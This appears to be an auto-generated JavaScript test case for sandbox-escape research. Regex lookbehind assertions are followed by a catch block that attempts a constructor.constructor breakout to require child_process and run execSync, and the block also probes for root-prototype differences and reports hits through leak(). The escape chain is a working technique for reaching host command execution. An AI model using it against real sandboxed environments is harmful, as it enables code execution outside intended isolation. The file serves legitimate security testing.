try {
    assert.compareArray(/(?<=a(.\2)b(\1)).{4}/.exec('aabcacbc'), [
        'cacb',
        'a',
        ''
    ], '#1');
    assert.compareArray(/(?<=a(\2)b(..\1))b/.exec('aacbacb'), [
        'b',
        'ac',
        'ac'
    ], '#2');
    assert.compareArray(/(?<=(?:\1b)(aa))./.exec('aabaax'), [
        'x',
        'aa'
    ], '#3');
    assert.compareArray(/(?<=(?:\1|b)(aa))./.exec('aaaax'), [
        'x',
        'aa'
    ], '#4');
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}